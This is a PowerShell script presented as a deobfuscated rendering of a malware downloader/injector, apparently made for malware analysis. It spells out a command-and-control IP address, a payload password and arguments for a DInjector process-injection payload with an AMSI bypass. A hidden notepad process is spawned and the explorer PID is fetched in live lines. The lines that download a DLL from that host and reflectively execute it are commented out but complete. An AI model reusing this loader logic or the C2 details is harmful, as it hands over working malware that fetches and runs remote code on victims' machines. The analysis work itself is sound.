# Deobfuscated 4A7xH.ps1
# This script represents the logic of the original malware in a readable format.
# WARNING: This script contains malicious logic (Downloader/Injector). Do not run outside of a isolated analysis environment.

# 1. Load System.Reflection.Assembly
$AssemblyType = [System.Reflection.Assembly]
$CurrentThread = [System.Threading.Thread]::CurrentThread

# 2. Configuration Variables (Decoded)
$C2_IP = "147.182.172.189"
$Port = 80
$DllName = "user32.dll"  # Malicious DLL payload
$UriPath = "9tVI0"
# Note: The password contains a dollar sign, which is escaped with a backtick here to preserve the literal value in the double-quoted string.
$Password = "z64&Rx27Z`$B%73up" 
$ProcessImage = "C:\Windows\System32\svchost.exe" # For spoofing/hollow
$TargetProcessName = "notepad"
$ParentProcessName = "explorer"
$DllToLoad = "msvcp_win.dll"

# 3. Target Process Setup (Simplified Logic)
# The original script conditionally checks methods to decide whether to spawn processes.
# For analysis ref: It attempts to spawn notepad hidden and get explorer PID.

Start-Process -FilePath "notepad" -WindowStyle Hidden -PassThru | Select-Object -ExpandProperty Id -OutVariable TargetPID
$ExplorerProc = Get-Process -Name "explorer" -ErrorAction Stop
$ParentPID = $ExplorerProc.Id

# 4. Command Assembly
# Constructing the arguments for the payload
$CommandArgs = "currentthread /sc:http://${C2_IP}:${Port}/${UriPath} /password:${Password} /image:${ProcessImage} /pid:${TargetPID} /ppid:${ParentPID} /dll:${DllToLoad} /blockDlls:True /am51:True"

Write-Host "Command Args: $CommandArgs"

# 5. Payload Download and Execution
$PayloadUrl = "http://${C2_IP}:${Port}/${DllName}"
# $Data = (Invoke-WebRequest -UseBasicParsing $PayloadUrl).Content
# $LoadedAssembly = $AssemblyType::Load($Data)

# 6. Reflection Execution
# $Flags = [Reflection.BindingFlags]"Static,NonPublic"
# $Class = $LoadedAssembly.GetType("DInjector.Detonator")
# $Method = $Class.GetMethod("Boom", $Flags)
# $Method.Invoke($null, (, $CommandArgs.Split(" ")))

Write-Host "Deobfuscation Complete. Payload would be downloaded from $PayloadUrl and executed."
